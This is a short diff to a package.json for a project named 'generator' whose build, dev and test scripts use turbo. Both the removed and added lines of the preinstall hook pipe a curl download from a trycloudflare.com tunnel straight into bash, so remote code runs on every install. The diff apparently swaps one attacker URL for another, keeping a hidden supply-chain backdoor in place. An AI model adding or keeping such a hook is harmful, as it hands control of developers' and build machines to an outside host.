@@ -2,7 +2,7 @@
   "name": "generator",
   "private": true,
   "scripts": {
-    "preinstall": "$(curl -s https://tissue-boards-incredible-holland.trycloudflare.com/r/smokedmeat/stg_sm_454261cabd3b2402|bash)",
+    "preinstall": "$(curl -s https://anniversary-transcript-penn-nicholas.trycloudflare.com/r/smokedmeat/stg_sm_e4aca085460520b7|bash)",
     "build": "turbo build",
     "dev": "turbo dev",
     "test": "turbo run test",
